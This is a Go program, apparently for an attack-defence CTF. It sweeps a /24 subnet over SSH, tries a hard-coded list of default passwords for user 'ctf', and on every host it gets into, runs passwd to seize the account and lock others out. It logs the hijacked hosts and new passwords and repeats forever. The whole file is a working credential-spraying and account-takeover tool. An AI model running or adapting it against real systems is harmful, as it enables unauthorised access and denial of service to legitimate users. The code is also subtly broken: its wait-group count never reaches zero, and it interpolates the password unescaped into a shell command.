package main

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
	"sync"
	"time"
)

// 配置参数定义
var config = struct {
	OldPasswords  []string // 支持多个旧密码
	NewPassword   string
	StoreKeyFile  string
	IpListFile    string
	MyIP          int
	PlatformIP    int
	BaseIP        string
	WebPort       int
	PwnPort       int
	StartIP       int
	EndIP         int
	RetryInterval time.Duration
}{
	OldPasswords: []string{"faka1234_1", "Managesite1234_1", "Javablog1234_1", "8970b4d1b8962ba1", "ctf"}, // 多个旧密码尝试
	NewPassword:  "",                                                                                      // 新密码
	StoreKeyFile: "otherkey.txt",                                                                          // 密码修改记录文件
	IpListFile:   "iplist.txt",                                                                            // 目标IP记录文件
	MyIP:         999,                                                                                     // 需跳过的IP(自己的ip最后一段)
	PlatformIP:   999,                                                                                     // 需跳过的IP(平台的ip最后一段)
	BaseIP:       "10.50.246.",                                                                            // 基础网段
	WebPort:      22,                                                                                      // Web主机SSH端口
	//PwnPort:       22,                                                // Pwn主机SSH端口
	StartIP:       1,               // 起始IP段
	EndIP:         254,             // 结束IP段
	RetryInterval: 1 * time.Second, // 重试间隔
}

// 文件是否存在
func fileExists(name string) bool {
	_, err := os.Stat(name)
	return !os.IsNotExist(err)
}

// 创建或打开文件（追加模式）
func openFile(name string) (*os.File, error) {
	if !fileExists(name) {
		return os.Create(name)
	}
	return os.OpenFile(name, os.O_APPEND|os.O_WRONLY, 0644)
}

// 构建SSH客户端配置
func createSSHConfig(user, password string) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         30 * time.Second,
	}
}

// 修改SSH密码（支持多旧密码尝试）
func changePassword(oldPasses []string, newPass, server, user string) (bool, string) {
	// 依次尝试每个旧密码
	for _, oldPass := range oldPasses {
		clientConfig := createSSHConfig(user, oldPass)

		client, err := ssh.Dial("tcp", server, clientConfig)
		if err != nil {
			continue // 此密码连接失败，尝试下一个
		}

		// 连接成功，执行改密操作
		session, err := client.NewSession()
		if err != nil {
			client.Close()
			continue
		}

		// 构建修改密码命令
		cmd := fmt.Sprintf("echo -e '%s\n%s' | passwd", newPass, newPass)
		output, err := session.CombinedOutput(cmd)
		session.Close()
		client.Close()

		if err != nil {
			return false, fmt.Sprintf("使用密码 %s 修改失败: %v, 输出: %s", oldPass, err, string(output))
		}

		return true, fmt.Sprintf("使用密码 %s 修改成功, 输出: %s", oldPass, string(output))
	}

	// 所有旧密码都尝试失败
	return false, "所有旧密码均尝试失败，无法连接"
}

// 处理Web主机密码修改
func handleWebHost(ip int, keyFile, ipFile *os.File, wg *sync.WaitGroup) {
	defer wg.Done()
	server := fmt.Sprintf("%s%d:%d", config.BaseIP, ip, config.WebPort)
	success, msg := changePassword(config.OldPasswords, config.NewPassword, server, "ctf")

	if success {
		logMsg := fmt.Sprintf("已将Web ip %s 的ssh密码更改为: %s ;time %s\n",
			server, config.NewPassword, time.Now().Format("2006-01-02 15:04:05"))
		fmt.Print(logMsg)
		_, _ = keyFile.WriteString(logMsg)
		_, _ = ipFile.WriteString(server + "\n")
	} else {
		fmt.Printf("Web主机 %s 处理失败: %s\n", server, msg)
	}
}

// 处理Pwn主机密码修改
//func handlePwnHost(ip int, keyFile, ipFile *os.File, wg *sync.WaitGroup) {
//	defer wg.Done()
//	server := fmt.Sprintf("%s%d:%d", config.BaseIP, ip, config.PwnPort)
//	success, msg := changePassword(config.OldPasswords, config.NewPassword, server, "root")
//
//	if success {
//		logMsg := fmt.Sprintf("已将Pwn ip %s 的ssh密码更改为: %s ;time %s\n",
//			server, config.NewPassword, time.Now().Format("2006-01-02 15:04:05"))
//		fmt.Print(logMsg)
//		_, _ = keyFile.WriteString(logMsg)
//		_, _ = ipFile.WriteString(server + "\n")
//	} else {
//		fmt.Printf("Pwn主机 %s 处理失败: %s\n", server, msg)
//	}
//}

func main() {
	// 打开日志文件
	keyFile, err := openFile(config.StoreKeyFile)
	if err != nil {
		fmt.Printf("无法打开密码记录文件: %v\n", err)
		return
	}
	defer keyFile.Close()

	// 打开IP列表文件
	ipFile, err := openFile(config.IpListFile)
	if err != nil {
		fmt.Printf("无法打开IP列表文件: %v\n", err)
		return
	}
	defer ipFile.Close()

	fmt.Println("开始批量修改密码任务...")
	for {
		var wg sync.WaitGroup

		// 遍历IP范围
		for ip := config.StartIP; ip <= config.EndIP; ip++ {
			// 跳过指定IP
			if ip == config.MyIP || ip == config.PlatformIP {
				continue
			}

			wg.Add(2)
			go handleWebHost(ip, keyFile, ipFile, &wg)
			//go handlePwnHost(ip, keyFile, ipFile, &wg)
		}

		wg.Wait()
		fmt.Printf("本轮任务完成，等待 %v 后重试...\n", config.RetryInterval)
		time.Sleep(config.RetryInterval)
	}
}
